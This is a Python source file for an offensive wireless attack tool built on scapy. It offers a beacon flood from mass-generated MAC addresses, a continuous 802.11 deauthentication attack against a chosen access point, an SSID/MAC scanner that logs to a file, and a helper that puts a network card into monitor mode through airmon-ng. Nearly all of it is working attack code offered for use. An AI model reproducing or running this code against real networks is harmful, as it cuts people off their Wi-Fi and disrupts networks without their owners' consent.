'''
@author:jiushi
@time:2019/1/4
'''
#-*-coding:utf-8-*-
from scapy.all import *
import optparse
import os

banner="""
signature:今生今世非你不娶
"""
print(banner)
print('[!] Reminder: This tool needs to install the airmon-ng tool.')
print('')
print('')
print('1.Generate a large number of mac addresses for flood attacks')
print('2.Dot11Deauch attack')
print('3.SSID and MAC scan')
print('4.NIC open monitor mode')
print('')
print('')

mac_list=[]
ssid_list=[]

def main():
    parser=optparse.OptionParser()
    parser.add_option('-r',dest='rmac',help='rhost_mac')
    parser.add_option('-m',dest='macaddresses',help='mac addresses',action='store_true')
    parser.add_option('-d',dest='deauch',help='Deauch attack',action='store_true')
    parser.add_option('-s',dest='scan',help='ssid and macscan',action='store_true')
    parser.add_option('-f',dest='iface',help='network iface',action='store')
    parser.add_option('-t',dest='start',help='nic open monitor mode',action='store_true')
    (options,args)=parser.parse_args()
    if options.macaddresses and options.iface and options.rmac:
        ifaces=options.iface
        rsmac=options.rmac
        mac_addresses(ifaces,rsmac)
    elif options.deauch and options.iface and options.rmac:
        iface2=options.iface
        rs2mac=options.rmac
        attack(iface2,rs2mac)
    elif options.scan and options.iface:
        iface3=options.iface
        xj=open('save.txt','w')
        xj.close()
        print('[+] SSID scan:')
        print('[!] Ctrl+C stop')
        print('')
        print('')
        sniff(iface=iface3,prn=scan)
    elif options.start and options.iface:
        iface0=options.iface
        start(iface0)
    else:
        parser.print_help()
        exit()

def mac_addresses(iface1,rsmac):
    print('[+] mac_addresses')
    print('')
    n=[]
    m=[]
    for k in range(65, 71):
        n.append(chr(k))

    for q in range(0, 9):
        m.append(q)
    for v in n:
        for l in m:
            for k in n:
                for w in m:
                    for s in n:
                        for mq in m:
                            for q in n:
                                for p in m:
                                    for o in n:
                                        for g in m:
                                            for we in n:
                                                for wq in m:
                                                    macss = "{}{}:{}{}:{}{}:{}{}:{}{}:{}{}".format(v, l, k, w, s, mq, q,p, o, g, we, wq)
                                                    data=RadioTap()/Dot11(subtype=11,addr1="ff:ff:ff:ff:ff:ff",addr2="{}".format(macss),addr3=rsmac,addr4=rsmac)/Dot11Beacon(timestamp=70180)
                                                    sendp(data,iface=iface1)

def attack(iface2,rs2mac):
    print('[+] Dot11Deauth attak')
    print('')
    while True:
        data2=RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff",addr2=rs2mac,addr3=rs2mac)/Dot11Deauth()
        data3=RadioTap()/Dot11(addr1=rs2mac,addr2="ff:ff:ff:ff:ff:ff",addr3="ff:ff:ff:ff:ff:ff")/Dot11Deauth()
        sendp(data2,iface=iface2)
        sendp(data3,iface=iface2)

def scan(jianting):
    if jianting.haslayer(Dot11Elt):
        if jianting.type==0 and jianting.subtype==8:
            if not jianting.addr2 in mac_list:
                mac_list.append(jianting.addr2)
                ssid_list.append(jianting.info)
                print('[+] MAC:{} SSID:{}'.format(jianting.addr2,bytes.decode(jianting.info,encoding='utf-8')))
                print('MAC:{} SSID:{}'.format(jianting.addr2,bytes.decode(jianting.info,encoding='utf-8')),file=open('save.txt','a'))

def start(iface0):
    print('[+] start mon')
    print('')
    print('')
    os.system('sudo airmon-ng start {}'.format(iface0))

if __name__ == '__main__':
    main()
